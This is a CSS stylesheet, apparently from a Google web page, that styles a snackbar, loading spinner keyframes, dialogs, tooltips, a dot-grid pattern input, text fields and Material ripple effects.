@-webkit-keyframes quantumWizSimpleInputRemoveUnderline {
	0% {
		-webkit-transform: scaleX(1);
		transform: scaleX(1);
		opacity: 1
	}
	to {
		-webkit-transform: scaleX(1);
		transform: scaleX(1);
		opacity: 0
	}
}

@keyframes quantumWizSimpleInputAddUnderline {
	0% {
		-webkit-transform: scaleX(0);
		transform: scaleX(0)
	}
	to {
		-webkit-transform: scaleX(1);
		transform: scaleX(1)
	}
}

@-webkit-keyframes quantumWizSimpleInputAddUnderline {
	0% {
		-webkit-transform: scaleX(0);
		transform: scaleX(0)
	}
	to {
		-webkit-transform: scaleX(1);
		transform: scaleX(1)
	}
}

.Mh0NNb {
	background-color: #323232;
	bottom: 0;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	-webkit-box-shadow: 0 6px 10px 0 rgba(0, 0, 0, 0.14), 0 1px 18px 0 rgba(0, 0, 0, 0.12), 0 3px 5px -1px rgba(0, 0, 0, 0.2);
	box-shadow: 0 6px 10px 0 rgba(0, 0, 0, 0.14), 0 1px 18px 0 rgba(0, 0, 0, 0.12), 0 3px 5px -1px rgba(0, 0, 0, 0.2);
	color: #fff;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-flex-direction: column;
	flex-direction: column;
	font-size: 14px;
	left: 0;
	min-height: 48px;
	position: fixed;
	right: 0;
	-webkit-transform: translate(0, 100%);
	transform: translate(0, 100%);
	visibility: hidden;
	z-index: 99999
}

.M6tHv {
	-webkit-box-align: center;
	box-align: center;
	-webkit-align-items: center;
	align-items: center;
	-webkit-align-content: center;
	align-content: center;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-flex-direction: row;
	flex-direction: row;
	min-height: inherit;
	padding: 0
}

.aGJE1b {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	-webkit-flex-shrink: 1;
	flex-shrink: 1;
	line-height: normal;
	overflow: hidden;
	padding: 14px 24px;
	text-overflow: ellipsis;
	word-break: break-word
}

.x95qze {
	-webkit-align-self: center;
	align-self: center;
	color: #eeff41;
	-webkit-box-flex: 0;
	box-flex: 0;
	-webkit-flex-grow: 0;
	flex-grow: 0;
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	float: right;
	text-transform: uppercase;
	font-weight: 500;
	display: inline-block;
	cursor: pointer;
	outline: none;
	padding: 14px 24px
}

.KYZn9b {
	background-color: #4285f4
}

.misTTe {
	-webkit-transform: translate(0, 0);
	transform: translate(0, 0)
}

@media screen and (min-width:481px) {
	.Mh0NNb {
		min-width: 288px;
		max-width: 568px;
		-webkit-border-radius: 2px;
		border-radius: 2px
	}
	.Mp2Z0b {
		left: 24px;
		margin-right: 24px;
		right: auto
	}
	.VcC8Fc {
		left: 50%;
		right: auto;
		-webkit-transform: translate(-50%, 100%);
		transform: translate(-50%, 100%)
	}
	.Mp2Z0b.misTTe {
		bottom: 24px
	}
	.VcC8Fc.misTTe {
		bottom: 0;
		-webkit-transform: translate(-50%, 0);
		transform: translate(-50%, 0)
	}
	.M6tHv {
		padding: 0
	}
	.aGJE1b {
		padding-right: 24px
	}
}

@media screen and (max-width:480px) {
	.xbgI6e .aGJE1b,
	.xbgI6e .x95qze {
		padding-bottom: 24px;
		padding-top: 24px
	}
}

@media screen and (min-width:481px) and (max-width:568px) {
	.Mh0NNb {
		max-width: 90%
	}
}

@media screen and (min-width:569px) {
	.Mh0NNb {
		max-width: 568px
	}
}

.Ux1Om {
	list-style-type: none;
	padding-left: 0
}

.Ux1Om li {
	line-height: 20px;
	margin-bottom: 8px
}

.i94Jlc {
	margin-bottom: 8px
}

.zeRELc .ibdqA {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.zeRELc .ibdqA .lCoei {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	padding-bottom: 12px;
	padding-top: 12px
}

.zeRELc .eARute .lCoei {
	padding-bottom: 14px;
	padding-top: 14px
}

.UXurCe {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.VRMoVc {
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	color: #5f6368;
	height: 20px;
	margin: 0 4px;
	width: 20px
}

.VRMoVc svg {
	height: 100%;
	width: 100%
}

.BHzsHc {
	color: #3c4043;
	font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif;
	font-size: 14px;
	font-weight: 500;
	margin-left: 12px
}

.n3x5Fb {
	-webkit-align-self: center;
	align-self: center;
	color: #d93025;
	display: none;
	height: 24px;
	overflow: hidden;
	padding-left: 0;
	width: 24px
}

.flESue .n3x5Fb {
	display: block
}

.flESue .cRiDhf {
	display: none
}

.A6Vkpf {
	margin-left: -8px;
	margin-top: 32px
}

.xFQFKe {
	-webkit-align-items: center;
	align-items: center;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	font-family: roboto, arial, sans-serif;
	margin: 8px 0
}

.HVc8K {
	color: #5f6368;
	font-size: 14px;
	letter-spacing: .2px;
	line-height: 20px;
	margin: 0
}

.NeB4t {
	margin: 0;
	color: #202124;
	font-size: 16px;
	font-weight: 400;
	letter-spacing: .1px;
	line-height: 24px
}

.C4fRcb {
	-webkit-box-flex: none;
	-webkit-flex: none;
	flex: none;
	height: 36px;
	margin-right: 16px;
	width: 36px
}

html {
	-webkit-tap-highlight-color: rgba(0, 0, 0, 0)
}

body,
input,
textarea,
select,
button {
	color: #202124;
	font-family: roboto, 'Noto Sans Myanmar UI', arial, sans-serif
}

body {
	background: #fff;
	direction: ltr;
	font-size: 14px;
	line-height: 1.4286;
	margin: 0;
	padding: 0
}

.H2SoFe,
.H2SoFe:before,
.H2SoFe:after {
	-webkit-box-sizing: border-box;
	box-sizing: border-box
}

.H2SoFe *,
.H2SoFe *:before,
.H2SoFe *:after {
	-webkit-box-sizing: inherit;
	box-sizing: inherit
}

@media all and (min-width:601px) {
	.H2SoFe {
		display: -webkit-box;
		display: -webkit-flex;
		display: flex;
		-webkit-flex-direction: column;
		flex-direction: column;
		min-height: 100vh;
		position: relative
	}
	.H2SoFe:before,
	.H2SoFe:after {
		content: '';
		display: block;
		-webkit-box-flex: 1;
		box-flex: 1;
		-webkit-flex-grow: 1;
		flex-grow: 1;
		height: 24px
	}
	.H2SoFe:before {
		min-height: 30px
	}
	.H2SoFe:after {
		min-height: 24px
	}
	.H2SoFe.LZgQXe:after {
		min-height: 63.9996px
	}
}

.H2SoFe .c8DD0,
.H2SoFe .IdAqtf {
	position: fixed
}

@media all and (min-width:601px) {
	.H2SoFe .c8DD0,
	.H2SoFe .IdAqtf {
		position: absolute
	}
}

.H2SoFe~.nY5oDd,
.H2SoFe~.nY5oDd .jveIPe {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-flex-direction: column;
	flex-direction: column
}

.H2SoFe~.nY5oDd {
	-webkit-border-radius: 8px;
	border-radius: 8px;
	color: #5f6368;
	font-size: 14px;
	left: 50%;
	letter-spacing: .25px;
	line-height: 1.4286;
	max-height: 90vh;
	max-width: 90vw;
	overflow: auto;
	position: fixed;
	top: 50%;
	-webkit-transform: translate(-50%, -50%);
	transform: translate(-50%, -50%);
	width: 280px
}

@media all and (min-height:270px) {
	.H2SoFe~.nY5oDd {
		min-height: 240px;
		overflow-y: visible
	}
	.H2SoFe~.nY5oDd.fh9DEc {
		overflow-y: auto
	}
}

.H2SoFe~.nY5oDd.nDmuSb {
	width: auto
}

.H2SoFe~.nY5oDd .fuqAvf {
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	overflow: visible;
	padding: 24px 24px 12px
}

@media all and (min-height:270px) {
	.H2SoFe~.nY5oDd .fuqAvf {
		overflow-y: auto
	}
	.H2SoFe~.nY5oDd.fh9DEc .fuqAvf {
		overflow-y: visible
	}
}

.H2SoFe~.nY5oDd .jE5rrf {
	color: #202124;
	font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif;
	font-size: 20px;
	font-weight: 500;
	letter-spacing: .25px;
	line-height: 1.3333;
	margin-bottom: 16px
}

.H2SoFe~.nY5oDd .z2Z95 {
	color: #f44336
}

.H2SoFe~.nY5oDd .jE5rrf:empty {
	margin: 0
}

.H2SoFe~.nY5oDd .jE5rrf:empty~.RUor5 {
	font-size: 16px
}

.H2SoFe~.nY5oDd .RUor5>:first-child {
	margin-top: 0
}

.H2SoFe~.nY5oDd .RUor5>:last-child {
	margin-bottom: 0
}

.H2SoFe~.nY5oDd .jveIPe {
	-webkit-align-items: flex-end;
	align-items: flex-end;
	-webkit-flex-direction: row-reverse;
	flex-direction: row-reverse;
	-webkit-flex-shrink: 0;
	flex-shrink: 0;
	padding: 4px 16px 12px;
	text-align: right
}

.H2SoFe~.nY5oDd.nDmuSb .jveIPe {
	display: block;
	padding-bottom: 0;
	position: relative
}

.H2SoFe~.nY5oDd .x81T2e {
	-webkit-border-radius: 2px;
	border-radius: 2px;
	padding: 12px
}

.H2SoFe~.nY5oDd .x81T2e:focus {
	background-color: rgba(0, 0, 0, 0.12)
}

.H2SoFe~.qggrzb {
	bottom: 0;
	left: 0;
	position: fixed;
	right: 0;
	top: 0
}

.ub32Ld {
	margin-top: 24px
}

.UDrTB {
	margin-left: -8px
}

.UDrTB .snByac {
	-webkit-align-items: center;
	align-items: center;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	text-transform: uppercase
}

.ofgune {
	margin-left: 6px;
	-webkit-transition: transform .2s cubic-bezier(.4, 0, .2, 1);
	transition: transform .2s cubic-bezier(.4, 0, .2, 1)
}

.ub32Ld.jVwmLb .ZCr9k {
	-webkit-transform: rotate(-180deg);
	transform: rotate(-180deg)
}

.ZCr9k {
	display: block
}

.BjYuJc {
	-webkit-transition: .2s cubic-bezier(.4, 0, .2, 1);
	transition: .2s cubic-bezier(.4, 0, .2, 1)
}

.ub32Ld.jVwmLb .BjYuJc {
	margin-bottom: 0;
	margin-top: 0;
	max-height: 0;
	opacity: 0;
	visibility: hidden
}

.VwCw {
	display: none
}

.Fw7gcf {
	min-height: 400px
}

.UbV2Oc {
	margin-top: 128px;
	text-align: center
}

.EmVfjc {
	display: inline-block;
	position: relative;
	width: 28px;
	height: 28px
}

.Cg7hO {
	position: absolute;
	width: 0;
	height: 0;
	overflow: hidden
}

.xu46lf {
	width: 100%;
	height: 100%
}

.EmVfjc.qs41qe .xu46lf {
	-webkit-animation: spinner-container-rotate 1568ms linear infinite;
	-webkit-animation: spinner-container-rotate 1568ms linear infinite;
	animation: spinner-container-rotate 1568ms linear infinite
}

.ir3uv {
	position: absolute;
	width: 100%;
	height: 100%;
	opacity: 0
}

.uWlRce {
	border-color: #4285f4
}

.GFoASc {
	border-color: #db4437
}

.WpeOqd {
	border-color: #f4b400
}

.rHV3jf {
	border-color: #0f9d58
}

.EmVfjc.qs41qe .ir3uv.uWlRce {
	-webkit-animation: spinner-fill-unfill-rotate 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both, spinner-blue-fade-in-out 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both;
	-webkit-animation: spinner-fill-unfill-rotate 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both, spinner-blue-fade-in-out 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both;
	animation: spinner-fill-unfill-rotate 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both, spinner-blue-fade-in-out 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both
}

.EmVfjc.qs41qe .ir3uv.GFoASc {
	-webkit-animation: spinner-fill-unfill-rotate 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both, spinner-red-fade-in-out 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both;
	-webkit-animation: spinner-fill-unfill-rotate 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both, spinner-red-fade-in-out 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both;
	animation: spinner-fill-unfill-rotate 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both, spinner-red-fade-in-out 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both
}

.EmVfjc.qs41qe .ir3uv.WpeOqd {
	-webkit-animation: spinner-fill-unfill-rotate 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both, spinner-yellow-fade-in-out 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both;
	-webkit-animation: spinner-fill-unfill-rotate 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both, spinner-yellow-fade-in-out 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both;
	animation: spinner-fill-unfill-rotate 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both, spinner-yellow-fade-in-out 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both
}

.EmVfjc.qs41qe .ir3uv.rHV3jf {
	-webkit-animation: spinner-fill-unfill-rotate 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both, spinner-green-fade-in-out 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both;
	-webkit-animation: spinner-fill-unfill-rotate 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both, spinner-green-fade-in-out 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both;
	animation: spinner-fill-unfill-rotate 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both, spinner-green-fade-in-out 5332ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both
}

.HBnAAc {
	position: absolute;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	top: 0;
	left: 45%;
	width: 10%;
	height: 100%;
	overflow: hidden;
	border-color: inherit
}

.HBnAAc .X6jHbb {
	width: 1000%;
	left: -450%
}

.xq3j6 {
	display: inline-block;
	position: relative;
	width: 50%;
	height: 100%;
	overflow: hidden;
	border-color: inherit
}

.xq3j6 .X6jHbb {
	width: 200%
}

.X6jHbb {
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	-webkit-box-sizing: border-box;
	box-sizing: border-box;
	height: 100%;
	border-width: 3px;
	border-style: solid;
	border-color: inherit;
	border-bottom-color: transparent;
	-webkit-border-radius: 50%;
	border-radius: 50%;
	-webkit-animation: none;
	-webkit-animation: none;
	animation: none
}

.xq3j6.ERcjC .X6jHbb {
	border-right-color: transparent;
	-webkit-transform: rotate(129deg);
	-webkit-transform: rotate(129deg);
	transform: rotate(129deg)
}

.xq3j6.dj3yTd .X6jHbb {
	left: -100%;
	border-left-color: transparent;
	-webkit-transform: rotate(-129deg);
	-webkit-transform: rotate(-129deg);
	transform: rotate(-129deg)
}

.EmVfjc.qs41qe .xq3j6.ERcjC .X6jHbb {
	-webkit-animation: spinner-left-spin 1333ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both;
	-webkit-animation: spinner-left-spin 1333ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both;
	animation: spinner-left-spin 1333ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both
}

.EmVfjc.qs41qe .xq3j6.dj3yTd .X6jHbb {
	-webkit-animation: spinner-right-spin 1333ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both;
	-webkit-animation: spinner-right-spin 1333ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both;
	animation: spinner-right-spin 1333ms cubic-bezier(0.4, 0.0, 0.2, 1) infinite both
}

@keyframes spinner-container-rotate {
	to {
		-webkit-transform: rotate(360deg);
		transform: rotate(360deg)
	}
}

@-webkit-keyframes spinner-container-rotate {
	to {
		-webkit-transform: rotate(360deg);
		transform: rotate(360deg)
	}
}

@keyframes spinner-fill-unfill-rotate {
	12.5% {
		-webkit-transform: rotate(135deg);
		transform: rotate(135deg)
	}
	25% {
		-webkit-transform: rotate(270deg);
		transform: rotate(270deg)
	}
	37.5% {
		-webkit-transform: rotate(405deg);
		transform: rotate(405deg)
	}
	50% {
		-webkit-transform: rotate(540deg);
		transform: rotate(540deg)
	}
	62.5% {
		-webkit-transform: rotate(675deg);
		transform: rotate(675deg)
	}
	75% {
		-webkit-transform: rotate(810deg);
		transform: rotate(810deg)
	}
	87.5% {
		-webkit-transform: rotate(945deg);
		transform: rotate(945deg)
	}
	to {
		-webkit-transform: rotate(1080deg);
		transform: rotate(1080deg)
	}
}

@-webkit-keyframes spinner-fill-unfill-rotate {
	12.5% {
		-webkit-transform: rotate(135deg);
		transform: rotate(135deg)
	}
	25% {
		-webkit-transform: rotate(270deg);
		transform: rotate(270deg)
	}
	37.5% {
		-webkit-transform: rotate(405deg);
		transform: rotate(405deg)
	}
	50% {
		-webkit-transform: rotate(540deg);
		transform: rotate(540deg)
	}
	62.5% {
		-webkit-transform: rotate(675deg);
		transform: rotate(675deg)
	}
	75% {
		-webkit-transform: rotate(810deg);
		transform: rotate(810deg)
	}
	87.5% {
		-webkit-transform: rotate(945deg);
		transform: rotate(945deg)
	}
	to {
		-webkit-transform: rotate(1080deg);
		transform: rotate(1080deg)
	}
}

@keyframes spinner-blue-fade-in-out {
	0% {
		opacity: .99
	}
	25% {
		opacity: .99
	}
	26% {
		opacity: 0
	}
	89% {
		opacity: 0
	}
	90% {
		opacity: .99
	}
	to {
		opacity: .99
	}
}

@-webkit-keyframes spinner-blue-fade-in-out {
	0% {
		opacity: .99
	}
	25% {
		opacity: .99
	}
	26% {
		opacity: 0
	}
	89% {
		opacity: 0
	}
	90% {
		opacity: .99
	}
	to {
		opacity: .99
	}
}

@keyframes spinner-red-fade-in-out {
	0% {
		opacity: 0
	}
	15% {
		opacity: 0
	}
	25% {
		opacity: .99
	}
	50% {
		opacity: .99
	}
	51% {
		opacity: 0
	}
}

@-webkit-keyframes spinner-red-fade-in-out {
	0% {
		opacity: 0
	}
	15% {
		opacity: 0
	}
	25% {
		opacity: .99
	}
	50% {
		opacity: .99
	}
	51% {
		opacity: 0
	}
}

@keyframes spinner-yellow-fade-in-out {
	0% {
		opacity: 0
	}
	40% {
		opacity: 0
	}
	50% {
		opacity: .99
	}
	75% {
		opacity: .99
	}
	76% {
		opacity: 0
	}
}

@-webkit-keyframes spinner-yellow-fade-in-out {
	0% {
		opacity: 0
	}
	40% {
		opacity: 0
	}
	50% {
		opacity: .99
	}
	75% {
		opacity: .99
	}
	76% {
		opacity: 0
	}
}

@keyframes spinner-green-fade-in-out {
	0% {
		opacity: 0
	}
	65% {
		opacity: 0
	}
	75% {
		opacity: .99
	}
	90% {
		opacity: .99
	}
	to {
		opacity: 0
	}
}

@-webkit-keyframes spinner-green-fade-in-out {
	0% {
		opacity: 0
	}
	65% {
		opacity: 0
	}
	75% {
		opacity: .99
	}
	90% {
		opacity: .99
	}
	to {
		opacity: 0
	}
}

@keyframes spinner-left-spin {
	0% {
		-webkit-transform: rotate(130deg);
		transform: rotate(130deg)
	}
	50% {
		-webkit-transform: rotate(-5deg);
		transform: rotate(-5deg)
	}
	to {
		-webkit-transform: rotate(130deg);
		transform: rotate(130deg)
	}
}

@-webkit-keyframes spinner-left-spin {
	0% {
		-webkit-transform: rotate(130deg);
		transform: rotate(130deg)
	}
	50% {
		-webkit-transform: rotate(-5deg);
		transform: rotate(-5deg)
	}
	to {
		-webkit-transform: rotate(130deg);
		transform: rotate(130deg)
	}
}

@keyframes spinner-right-spin {
	0% {
		-webkit-transform: rotate(-130deg);
		transform: rotate(-130deg)
	}
	50% {
		-webkit-transform: rotate(5deg);
		transform: rotate(5deg)
	}
	to {
		-webkit-transform: rotate(-130deg);
		transform: rotate(-130deg)
	}
}

@-webkit-keyframes spinner-right-spin {
	0% {
		-webkit-transform: rotate(-130deg);
		transform: rotate(-130deg)
	}
	50% {
		-webkit-transform: rotate(5deg);
		transform: rotate(5deg)
	}
	to {
		-webkit-transform: rotate(-130deg);
		transform: rotate(-130deg)
	}
}

@keyframes spinner-fade-out {
	0% {
		opacity: .99
	}
	to {
		opacity: 0
	}
}

@-webkit-keyframes spinner-fade-out {
	0% {
		opacity: .99
	}
	to {
		opacity: 0
	}
}

.RM9ulf {
	visibility: hidden;
	position: fixed;
	z-index: 5000;
	color: #fff;
	pointer-events: none
}

.RM9ulf.catR2e {
	max-width: 90%;
	max-height: 90%
}

.R8qYlc {
	-webkit-border-radius: 2px;
	border-radius: 2px;
	background-color: rgba(97, 97, 97, 0.902);
	position: absolute;
	left: 0;
	width: 100%;
	height: 100%;
	opacity: 0;
	-webkit-transform: scale(0, 0.5);
	transform: scale(0, 0.5);
	-webkit-transform-origin: inherit;
	transform-origin: inherit
}

.AZnilc {
	display: block;
	position: relative;
	font-size: 10px;
	font-weight: 500;
	padding: 5px 8px 6px;
	opacity: 0
}

.RM9ulf.qs41qe .R8qYlc {
	opacity: 1;
	-webkit-transform: scale(1, 1);
	transform: scale(1, 1)
}

.RM9ulf.catR2e .AZnilc {
	word-wrap: break-word
}

.RM9ulf.qs41qe .AZnilc {
	opacity: 1
}

.RM9ulf.AXm5jc .AZnilc {
	font-size: 14px;
	padding: 8px 16px
}

.RM9ulf.u5lFJe {
	-webkit-transition-property: transform;
	transition-property: transform;
	-webkit-transition-duration: 200ms;
	transition-duration: 200ms;
	-webkit-transition-timing-function: cubic-bezier(0.24, 1, 0.32, 1);
	transition-timing-function: cubic-bezier(0.24, 1, 0.32, 1)
}

.RM9ulf.u5lFJe .R8qYlc {
	-webkit-transition-property: opacity, transform;
	transition-property: opacity, transform;
	-webkit-transition-duration: 50ms, 200ms;
	transition-duration: 50ms, 200ms;
	-webkit-transition-timing-function: linear, cubic-bezier(0.24, 1, 0.32, 1);
	transition-timing-function: linear, cubic-bezier(0.24, 1, 0.32, 1)
}

.RM9ulf.u5lFJe .AZnilc {
	-webkit-transition-property: opacity;
	transition-property: opacity;
	-webkit-transition-duration: 150ms;
	transition-duration: 150ms;
	-webkit-transition-delay: 50ms;
	transition-delay: 50ms;
	-webkit-transition-timing-function: cubic-bezier(0, 0, 0.6, 1);
	transition-timing-function: cubic-bezier(0, 0, 0.6, 1)
}

.RM9ulf.xCxor {
	-webkit-transition-property: opacity;
	transition-property: opacity;
	-webkit-transition-duration: 70ms;
	transition-duration: 70ms;
	-webkit-transition-delay: 0ms;
	transition-delay: 0ms;
	-webkit-transition-timing-function: linear;
	transition-timing-function: linear
}

.QR1Uof {
	margin: 0 auto;
	max-width: 324px;
	touch-action: none
}

.qkPsxc {
	-webkit-align-content: space-between;
	align-content: space-between;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-flex-wrap: wrap;
	flex-wrap: wrap;
	position: relative
}

.DFaRcf {
	height: 108px;
	width: -webkit-calc(100%/3);
	width: calc(100%/3)
}

.DFaRcf.RDPZE {
	pointer-events: none
}

.KWTyKe {
	height: 48px;
	width: 48px
}

.DFaRcf,
.KWTyKe {
	-webkit-align-items: center;
	align-items: center;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-justify-content: center;
	justify-content: center
}

.KWTyKe:after {
	border: 6px solid #3c4043;
	-webkit-border-radius: 6px;
	border-radius: 6px;
	content: '';
	height: 0;
	-webkit-transition: transform .4s cubic-bezier(.24, .48, .1, 1.32);
	transition: transform .4s cubic-bezier(.24, .48, .1, 1.32);
	width: 0
}

.DFaRcf.KKjvXb .KWTyKe:after {
	border-color: #1a73e8;
	-webkit-transform: scale(1.25);
	transform: scale(1.25)
}

.DFaRcf.RDPZE .KWTyKe:after {
	border-color: rgba(60, 64, 67, 0.502)
}

.DFaRcf.KKjvXb.RDPZE .KWTyKe:after {
	border-color: rgba(26, 115, 232, 0.502)
}

.UfIMtf {
	height: 100%;
	left: 0;
	position: absolute;
	top: 0;
	width: 100%;
	z-index: -1
}

.wffsV {
	border-color: #1a73e8;
	border-style: solid;
	position: absolute;
	-webkit-transition: opacity .4s linear;
	transition: opacity .4s linear
}

.QR1Uof.RDPZE .wffsV {
	border-color: rgba(26, 115, 232, 0.502)
}

.wffsV.BcOib {
	opacity: 0
}

.QR1Uof .uSvLId {
	-webkit-justify-content: center;
	justify-content: center
}

.dNDykb {
	margin: 16px 0;
	text-align: center
}

.qBHUIf {
	overflow-wrap: break-word;
	word-wrap: break-word;
	font-family: monospace;
	direction: ltr
}

.g4qune {
	text-align: initial
}

.nivknf {
	display: -webkit-box;
	display: -webkit-flex;
	display: flex
}

.g4qune .qBHUIf {
	-webkit-appearance: none;
	appearance: none;
	background: transparent;
	border: 0;
	color: #202124;
	-webkit-box-flex: 1;
	box-flex: 1;
	-webkit-flex-grow: 1;
	flex-grow: 1;
	font-size: inherit;
	line-height: inherit;
	outline: none;
	padding: 0;
	resize: none
}

.pia9G {
	display: none;
	margin-left: 8px
}

.g4qune.TD1bfc .pia9G {
	display: block
}

.NCTw7e.mUbCce {
	height: 24px;
	width: 24px
}

.NCTw7e .Ce1Y1c {
	color: #5f6368
}

.plA1sc {
	color: #80868b;
	display: block;
	font-size: 12px;
	margin-bottom: 8px
}

.Odb1Cc .qBHUIf {
	font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif;
	font-size: 44px;
	line-height: 1.18181
}

@keyframes mdc-ripple-fg-radius-in {
	0% {
		-webkit-animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
		animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
		-webkit-transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1);
		transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1)
	}
	to {
		-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
		transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
	}
}

@keyframes mdc-ripple-fg-opacity-in {
	0% {
		-webkit-animation-timing-function: linear;
		animation-timing-function: linear;
		opacity: 0
	}
	to {
		opacity: var(--mdc-ripple-fg-opacity, 0)
	}
}

@keyframes mdc-ripple-fg-opacity-out {
	0% {
		-webkit-animation-timing-function: linear;
		animation-timing-function: linear;
		opacity: var(--mdc-ripple-fg-opacity, 0)
	}
	to {
		opacity: 0
	}
}

.VfPpkd-ksKsZd-XxIAqe {
	--mdc-ripple-fg-size: 0;
	--mdc-ripple-left: 0;
	--mdc-ripple-top: 0;
	--mdc-ripple-fg-scale: 1;
	--mdc-ripple-fg-translate-end: 0;
	--mdc-ripple-fg-translate-start: 0;
	-webkit-tap-highlight-color: rgba(0, 0, 0, 0);
	will-change: transform, opacity;
	position: relative;
	outline: none;
	overflow: hidden
}

.VfPpkd-ksKsZd-XxIAqe::before {
	position: absolute;
	-webkit-border-radius: 50%;
	border-radius: 50%;
	opacity: 0;
	pointer-events: none;
	content: ""
}

.VfPpkd-ksKsZd-XxIAqe::after {
	position: absolute;
	-webkit-border-radius: 50%;
	border-radius: 50%;
	opacity: 0;
	pointer-events: none;
	content: ""
}

.VfPpkd-ksKsZd-XxIAqe::before {
	-webkit-transition: opacity 15ms linear, background-color 15ms linear;
	transition: opacity 15ms linear, background-color 15ms linear;
	z-index: 1
}

.VfPpkd-ksKsZd-XxIAqe.VfPpkd-ksKsZd-mWPk3d::before {
	-webkit-transform: scale(var(--mdc-ripple-fg-scale, 1));
	transform: scale(var(--mdc-ripple-fg-scale, 1))
}

.VfPpkd-ksKsZd-XxIAqe.VfPpkd-ksKsZd-mWPk3d::after {
	top: 0;
	left: 0;
	-webkit-transform: scale(0);
	transform: scale(0);
	-webkit-transform-origin: center center;
	transform-origin: center center
}

.VfPpkd-ksKsZd-XxIAqe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-ZNMTqd::after {
	top: var(--mdc-ripple-top, 0);
	left: var(--mdc-ripple-left, 0)
}

.VfPpkd-ksKsZd-XxIAqe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-Tv8l5d-lJfZMc::after {
	-webkit-animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards;
	animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards
}

.VfPpkd-ksKsZd-XxIAqe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-Tv8l5d-OmS1vf::after {
	-webkit-animation: mdc-ripple-fg-opacity-out 150ms;
	animation: mdc-ripple-fg-opacity-out 150ms;
	-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
	transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
}

.VfPpkd-ksKsZd-XxIAqe::before {
	background-color: #000
}

.VfPpkd-ksKsZd-XxIAqe::after {
	background-color: #000
}

.VfPpkd-ksKsZd-XxIAqe:hover::before {
	opacity: .04
}

.VfPpkd-ksKsZd-XxIAqe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe::before {
	-webkit-transition-duration: 75ms;
	transition-duration: 75ms;
	opacity: .12
}

.VfPpkd-ksKsZd-XxIAqe:not(.VfPpkd-ksKsZd-mWPk3d):focus::before {
	-webkit-transition-duration: 75ms;
	transition-duration: 75ms;
	opacity: .12
}

.VfPpkd-ksKsZd-XxIAqe:not(.VfPpkd-ksKsZd-mWPk3d)::after {
	-webkit-transition: opacity 150ms linear;
	transition: opacity 150ms linear
}

.VfPpkd-ksKsZd-XxIAqe:not(.VfPpkd-ksKsZd-mWPk3d):active::after {
	-webkit-transition-duration: 75ms;
	transition-duration: 75ms;
	opacity: .12
}

.VfPpkd-ksKsZd-XxIAqe.VfPpkd-ksKsZd-mWPk3d {
	--mdc-ripple-fg-opacity: .12
}

